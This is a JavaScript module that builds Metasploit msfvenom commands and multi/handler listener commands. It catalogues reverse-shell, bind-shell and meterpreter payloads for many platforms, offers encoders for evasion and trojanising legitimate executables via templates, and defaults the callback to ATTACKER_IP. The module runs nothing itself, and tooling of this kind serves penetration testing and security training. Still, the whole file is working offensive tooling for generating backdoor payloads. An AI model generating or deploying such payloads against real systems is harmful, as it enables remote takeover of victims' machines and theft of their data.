// msfvenom command builder — pure string templates, nothing is run. Pick a payload and
// options and copy the command. Payload/format/encoder lists track common Metasploit output.

export const FORMATS = {
  Executable: ['exe', 'exe-service', 'exe-only', 'msi', 'elf', 'elf-so', 'macho', 'dll', 'apk', 'jar', 'war'],
  Script: ['psh', 'psh-cmd', 'psh-net', 'psh-reflection', 'python', 'bash', 'perl'],
  'Source / raw': ['raw', 'c', 'csharp', 'hex', 'base64', 'powershell', 'ruby', 'js_le', 'js_be', 'vbscript', 'vbapplication', 'dword', 'num'],
};
export const ALL_FORMATS = Object.values(FORMATS).flat();

export const ENCODERS = ['', 'x86/shikata_ga_nai', 'x86/call4_dword_xor', 'x86/countdown', 'x64/xor', 'x64/xor_dynamic', 'cmd/powershell_base64', 'php/base64', 'ruby/base64', 'generic/eicar'];
export const ARCHS = ['', 'x86', 'x64', 'x86_64', 'armle', 'aarch64', 'mipsle', 'php', 'python', 'java', 'cmd'];
export const PLATFORMS = ['', 'windows', 'linux', 'osx', 'android', 'php', 'python', 'java', 'nodejs', 'unix'];

// kind: reverse → needs LHOST+LPORT · bind → LPORT · exec → CMD · plain → nothing
export const PAYLOADS = [
  // Windows
  { id: 'windows/x64/meterpreter/reverse_tcp', os: 'windows', arch: 'x64', kind: 'reverse' },
  { id: 'windows/x64/meterpreter/reverse_https', os: 'windows', arch: 'x64', kind: 'reverse' },
  { id: 'windows/x64/meterpreter/bind_tcp', os: 'windows', arch: 'x64', kind: 'bind' },
  { id: 'windows/x64/shell_reverse_tcp', os: 'windows', arch: 'x64', kind: 'reverse' },
  { id: 'windows/meterpreter/reverse_tcp', os: 'windows', arch: 'x86', kind: 'reverse' },
  { id: 'windows/meterpreter/reverse_https', os: 'windows', arch: 'x86', kind: 'reverse' },
  { id: 'windows/meterpreter/bind_tcp', os: 'windows', arch: 'x86', kind: 'bind' },
  { id: 'windows/shell_reverse_tcp', os: 'windows', arch: 'x86', kind: 'reverse' },
  { id: 'windows/shell/reverse_tcp', os: 'windows', arch: 'x86', kind: 'reverse' },
  { id: 'windows/exec', os: 'windows', arch: 'x86', kind: 'exec' },
  // Linux
  { id: 'linux/x64/meterpreter/reverse_tcp', os: 'linux', arch: 'x64', kind: 'reverse' },
  { id: 'linux/x64/meterpreter_reverse_tcp', os: 'linux', arch: 'x64', kind: 'reverse' },
  { id: 'linux/x64/shell_reverse_tcp', os: 'linux', arch: 'x64', kind: 'reverse' },
  { id: 'linux/x64/shell_bind_tcp', os: 'linux', arch: 'x64', kind: 'bind' },
  { id: 'linux/x86/meterpreter/reverse_tcp', os: 'linux', arch: 'x86', kind: 'reverse' },
  { id: 'linux/x86/shell_reverse_tcp', os: 'linux', arch: 'x86', kind: 'reverse' },
  { id: 'linux/armle/meterpreter/reverse_tcp', os: 'linux', arch: 'armle', kind: 'reverse' },
  { id: 'linux/aarch64/meterpreter/reverse_tcp', os: 'linux', arch: 'aarch64', kind: 'reverse' },
  // macOS
  { id: 'osx/x64/meterpreter/reverse_tcp', os: 'osx', arch: 'x64', kind: 'reverse' },
  { id: 'osx/x64/shell_reverse_tcp', os: 'osx', arch: 'x64', kind: 'reverse' },
  // Android
  { id: 'android/meterpreter/reverse_tcp', os: 'android', arch: '', kind: 'reverse' },
  { id: 'android/meterpreter/reverse_https', os: 'android', arch: '', kind: 'reverse' },
  { id: 'android/shell/reverse_tcp', os: 'android', arch: '', kind: 'reverse' },
  // Web / interpreted
  { id: 'php/meterpreter/reverse_tcp', os: 'php', arch: 'php', kind: 'reverse' },
  { id: 'php/meterpreter_reverse_tcp', os: 'php', arch: 'php', kind: 'reverse' },
  { id: 'php/reverse_php', os: 'php', arch: 'php', kind: 'reverse' },
  { id: 'python/meterpreter/reverse_tcp', os: 'python', arch: 'python', kind: 'reverse' },
  { id: 'python/shell_reverse_tcp', os: 'python', arch: 'python', kind: 'reverse' },
  { id: 'cmd/unix/reverse_bash', os: 'unix', arch: 'cmd', kind: 'reverse' },
  { id: 'cmd/unix/reverse_python', os: 'unix', arch: 'cmd', kind: 'reverse' },
  { id: 'cmd/unix/reverse_perl', os: 'unix', arch: 'cmd', kind: 'reverse' },
  { id: 'cmd/windows/reverse_powershell', os: 'windows', arch: 'cmd', kind: 'reverse' },
  { id: 'java/jsp_shell_reverse_tcp', os: 'java', arch: 'java', kind: 'reverse' },
  { id: 'java/meterpreter/reverse_tcp', os: 'java', arch: 'java', kind: 'reverse' },
  { id: 'nodejs/shell_reverse_tcp', os: 'nodejs', arch: '', kind: 'reverse' },
];

const q = (s) => (/[^A-Za-z0-9._\-\/=]/.test(s) ? `'${s.replace(/'/g, `'\\''`)}'` : s);

export function build(o) {
  const p = PAYLOADS.find((x) => x.id === o.payload) || PAYLOADS[0];
  const parts = ['msfvenom', '-p', p.id];
  if (p.kind === 'reverse') { parts.push(`LHOST=${o.lhost || 'ATTACKER_IP'}`, `LPORT=${o.lport || '4444'}`); }
  else if (p.kind === 'bind') { parts.push(`LPORT=${o.lport || '4444'}`, `RHOST=${o.rhost || '0.0.0.0'}`); }
  else if (p.kind === 'exec') { parts.push(`CMD=${q(o.cmd || 'calc.exe')}`); }
  if (o.arch) parts.push('-a', o.arch);
  if (o.platform) parts.push('--platform', o.platform);
  if (o.encoder) { parts.push('-e', o.encoder); if (+o.iter > 0) parts.push('-i', String(+o.iter)); }
  if (o.badchars) parts.push('-b', q(o.badchars));
  if (o.nopsled && +o.nopsled > 0) parts.push('-n', String(+o.nopsled));
  if (o.template) { parts.push('-x', q(o.template)); if (o.keep) parts.push('-k'); }
  parts.push('-f', o.format || 'raw');
  if (o.out) parts.push('-o', q(o.out));
  else if (['exe', 'elf', 'macho', 'dll', 'apk', 'jar', 'war', 'msi', 'exe-service', 'exe-only', 'elf-so'].includes(o.format)) parts.push(`> ${q('payload.' + (o.format.split('-')[0]))}`);
  return parts.join(' ');
}

export function handler(o) {
  const p = PAYLOADS.find((x) => x.id === o.payload) || PAYLOADS[0];
  const lines = ['msfconsole -q -x "use exploit/multi/handler;', `set PAYLOAD ${p.id};`];
  if (p.kind === 'bind') lines.push(`set RHOST ${o.rhost || 'TARGET_IP'};`, `set LPORT ${o.lport || '4444'};`);
  else lines.push(`set LHOST ${o.lhost || '0.0.0.0'};`, `set LPORT ${o.lport || '4444'};`);
  return lines.join(' ') + ' set ExitOnSession false; exploit -j"';
}
